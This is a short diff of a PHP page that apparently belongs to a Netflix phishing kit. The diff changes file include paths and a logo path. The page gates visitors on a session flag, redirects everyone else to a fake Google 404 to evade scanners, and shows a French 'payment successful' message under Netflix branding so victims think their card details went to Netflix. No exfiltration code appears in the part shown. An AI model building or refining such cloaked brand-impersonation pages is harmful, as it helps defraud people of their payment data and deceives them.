@@ -1,7 +1,7 @@
 <?php
 session_start();
-include "./zebi/config.php";
-include "./zebi/functions.php";
+include "config.php";
+include "functions.php";
 
 if ($_SESSION['allow'] != "yes") {
     header('location: https://google.com/404');
@@ -110,7 +110,7 @@ unset($_SESSION['verification_page_notified']);
 </head>
 <body>
     <div class="success-container">
-        <img src="files/img/Logonetflix.png" alt="Netflix Logo" class="success-logo">
+        <img src="Logonetflix.png" alt="Netflix Logo" class="success-logo">
         <div class="success-message">Paiement réussi !</div>
         <p>Votre abonnement Netflix est maintenant actif. Profitez de vos films et séries préférés !</p>
         <a href="https://www.netflix.com" class="button">Accéder à Netflix</a>
